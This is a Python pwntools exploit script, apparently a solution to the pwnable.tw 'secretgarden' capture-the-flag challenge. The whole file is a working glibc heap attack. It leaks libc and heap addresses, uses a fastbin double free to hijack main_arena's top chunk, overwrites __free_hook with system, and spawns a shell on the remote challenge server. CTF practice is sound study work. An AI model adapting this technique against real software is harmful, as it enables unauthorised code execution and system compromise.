from pwn import *
import sys

context.arch = 'amd64'
elf = ELF('./secretgarden')
status = sys.argv[1]
info("Hijack main_arena.top_chunk_ptr")

if status == 'd':
    libc = ELF('./libc_64.so.6')
    context.log_level = "debug"
elif status == 'l':
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elif status == 'r':
    libc = ELF('./libc_64.so.6')
else:
    info("INVALID STATUS")
    exit()

def Raise(length, name, color):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    io.sendlineafter(" :", color)

def Visit():
    io.sendlineafter(" : ", "2")

def Remove(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

def pwnpwnpwn():
    global io
    if status == 'd':
        io = process('./secretgarden',env = {"LD_PRELOAD":"./libc_64.so.6"})
    elif status == 'l':
        io = process('./secretgarden')
    elif status == 'r':
        io = remote('chall.pwnable.tw',10203)
    else:
        exit()
    Raise(0xe0,'aaaa','xxxxxxxx')
    Raise(0x40,'aaaa','xxxxxxxx')
    Raise(0x40,'aaaa','xxxxxxxx')
    Raise(0x20,'stop','xxxxxxxx')
    Remove(0)
    Remove(1)
    Remove(2)
    Raise(0x80,'a','yyyyyyyy')
    Raise(0x40,'\x60','yyyyyyyy')
    Raise(0x40,'a','yyyyyyyy')
    Visit()
    io.recvuntil('Name of the flower[4] :')
    libc_base = u64(io.recv(6).ljust(8,'\x00'))-65-(libc.sym['__malloc_hook']+0x10)
    info('LIBC BASE -> %#x'%libc_base)
    io.recvuntil('Name of the flower[5] :')
    heap_base = u64(io.recv(6).ljust(8,'\x00'))-0x1160
    info('HEAP BASE -> %#x'%heap_base)
    if hex(heap_base).startswith("0x55"):
        io.close()
        info("assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim)));")
        pwnpwnpwn()
    Raise(0x40,'fktp','xxxxxxxx')	#7
    Raise(0x40,'fktp','xxxxxxxx')	#8
    Raise(0x40,'/bin/sh\x00','xxxxxxxx')#9
    Remove(7)
    Remove(8)
    Remove(7)
    fake_fd = p64(libc.sym['__malloc_hook']+0x10+libc_base+0x2d)
    Raise(0x40,fake_fd,'yyyyyyyy')	#10
    Raise(0x40,'fktp','yyyyyyyy')	#11
    Raise(0x40,'fktp','yyyyyyyy')	#12
    Raise(0x60,'fkfh','zzzzzzzz')	#13 take the stored fd's highest byte as a `size`
    Remove(13)
    fake_fm = '\x00'*(0x18+3)
    fake_fm += p64(libc.sym['__free_hook']-0xb58+libc_base)
    Raise(0x40,fake_fm,'wwwwwwww')	#14
    for i in range(0xd):
        Raise(0x90,'fkfh','uuuuuuuu')
    fake_fh = p64(0)*0x11
    fake_fh += p64(libc.sym['system']+libc_base)
    Raise(0x90,fake_fh,'vvvvvvvv')
    Remove(9)
    io.interactive()
pwnpwnpwn()

